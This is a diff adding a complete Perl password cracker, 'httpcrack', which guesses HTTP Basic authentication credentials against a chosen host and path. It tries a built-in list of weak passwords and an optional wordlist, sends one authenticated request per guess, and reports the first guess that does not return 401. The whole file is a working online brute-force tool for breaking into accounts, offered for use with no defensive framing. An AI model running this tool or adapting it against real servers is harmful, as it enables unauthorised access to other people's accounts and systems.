@@ -1,0 +1,130 @@
+#!/usr/bin/perl
+# httpcrack v.0.1.0
+# (C)opyright 2003, SodaPhish <sodaphish@securitylounge.com>, all rights reserved.
+# 
+# http://sodaphish.com
+#
+# `httpcrack` is a purpose built password cracker for HTTP/1.0 "Basic" authorization 
+# protected sites.  It is simple, relatively fast, and effective.
+#
+# last modified: May 13, 2003
+#
+# todo:
+# 	- support brute-force mode cracking (v.0.2.0)
+#	- show statistics on attempts per second, etc. (v.0.2.0)
+#	- support 'victim file' that lists URL's to crack (v.0.3.0)
+# 	- possibily eliminate building the socket on EVERY password attempt (v.0.?.?)
+# 
+# changes:
+#	- add support for wordlist files (v.0.1.0
+#	- improve command-line option passing (v.0.1.0)
+#	- have output to file (v.0.1.0)
+#
+use strict;
+use IO::Socket;
+use MIME::Base64;
+use Getopt::Std;
+
+my $ver = "v0.1.0"; 
+my %opts;
+getopt( 'u:h:p:i:o:', \%opts );
+
+if( !( defined( $opts{'u'} ) && defined( $opts{'h'} ) && defined( $opts{'p'} ))  )
+{
+	show_usage();
+	exit();
+}
+
+
+# change this info to find the key size.
+my $username = $opts{'u'}; 
+my $hostname = $opts{'h'};
+my $path = $opts{'p'};
+# this is the default password list... 
+my @passlist = ( "god", "g0d", "s3x", "sex", "power", "admin", "nimda", "4dm1n", "$opts{'u'}" ); 
+
+
+if( -e $opts{'i'} )
+{
+	open( IN, $opts{'i'} );
+	while( <IN> )
+	{
+		chomp( $_ );
+		push( @passlist, $_ );
+	}
+	close( IN );
+} elsif( defined( $opts{'i'} ) ){
+	print "E: $opts{'i'} does not exist!\n"; 
+	exit( -1 );
+}
+
+
+if( defined( $opts{'o'} ) )
+{
+	#we only open in append mode...
+	open( OUT, ">>$opts{'o'}" ); 
+}
+
+
+foreach( @passlist )
+{
+	if( check_pass( "$hostname", "$path", encode_base64( "$username:$_" ) ) !~ /401/ )
+	{
+		if( defined( $opts{'o'} ) )
+		{
+			print OUT "$username\@$hostname$path -> $_\n";
+		} else {
+			print "$username\@$hostname$path -> $_\n";
+		}
+		exit( 0 );
+	}
+}
+
+print "$username\@$hostname$path\nI've exhausted my list(s), I'm done, you're on your own.\n";
+
+if( defined( $opts{'o'} ) )
+{
+	close( OUT );
+}
+
+exit( 0 );
+
+
+
+
+
+sub check_pass 
+{
+	my( $host, $path, $authstring ) = @_; 
+	$path = "/" if( $path eq "" );
+
+	my $request = "GET $path HTTP/1.0\r\n" .
+		"Authorization: Basic $authstring\r\n" .
+		"\r\n\r\n"; 
+	my $r_sock = IO::Socket::INET->new( Proto=>"tcp", PeerAddr=>$host, PeerPort=>80 ) 
+		or die( "Couldn't bind to remote host! $!" ); 
+	#$r_sock->autoflush( 1 );
+	print $r_sock $request; 
+
+	my $result = <$r_sock>;
+	$result =~ /HTTP\S+\s(\d+)/;
+	$result = $1; 
+	close $r_sock; 
+
+	return $result; 
+}
+
+
+sub show_usage
+{
+
+	my $appname = `basename $0`; chomp $appname; 
+	print "$appname $ver - (C)opyright 2003, SodaPhish, all rights reserved.\n";
+	print "$0 [-i <filename>][-o <filename>] -u <user> -h <host> -p <uri path>\n";
+	print "\t-h : the dns hostname, or ip address of the server in question.\n"; 
+	print "\t-i : an optional input file containing a wordlist of passwords to try.\n"; 
+	print "\t-o : an optional output file where we store our results.\n";
+	print "\t-p : the URL (sans the domain name) we're attacking.\n"; 
+	print "\t-u : the username we're attacking.\n"; 
+
+} #end show_usage()
